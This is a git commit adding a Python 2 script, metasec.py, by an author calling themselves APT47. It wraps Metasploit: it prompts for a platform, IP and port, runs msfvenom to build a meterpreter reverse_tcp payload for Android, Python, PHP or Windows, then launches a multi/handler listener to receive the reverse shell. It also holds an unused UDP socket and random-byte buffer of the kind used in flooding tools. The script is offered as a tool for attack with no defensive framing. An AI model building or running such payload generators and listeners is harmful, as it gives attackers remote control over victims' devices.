9d3cbadd9a6319c4009ec9beda81a924336bc33b
APT-GET47 <57804710+MALW4R3@users.noreply.github.com>
2020-06-14 16:26:31 +0700

    Add files via upload

---
+++ metasec.py
@@ -0,0 +1,46 @@
+import os,sys
+import time
+import socket
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system ("figlet -f mono9 METASEC | lolcat -a")
+os.system ("neofetch --ascii_distro Kali --logo")
+time.sleep(3)
+os.system ("clear")
+os.system ("figlet PAYLOAD | lolcat")
+os.system ("neofetch --ascii_distro android --logo")
+os.system ("neofetch --ascii_distro Windows10 --logo")
+os.system ("cat /$HOME/METASEC-kali/python.txt | lolcat")
+os.system ("figlet -f slant PHP | lolcat")
+print
+print " BY : APT47 "
+print
+la = raw_input ("android/python/php/windows : ")
+ip = raw_input ("IP : ")
+port = raw_input ("PORT : ")
+out = raw_input ("OUTPUT : ")
+os.system ("msfvenom -p %s/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s" % (la, ip, port, out))
+os.system ("clear")
+os.system ("cat /$HOME/METASEC-kali/exploit.txt | lolcat")
+print
+print " PROGRAM BY APT47 "
+print
+la = raw_input ("android/python/php/windows : ")
+ip = raw_input ("IP : ")
+port = raw_input ("PORT : ")
+os.system ("msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD %s/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; exploit;'" % (la, ip, port,))
+
+
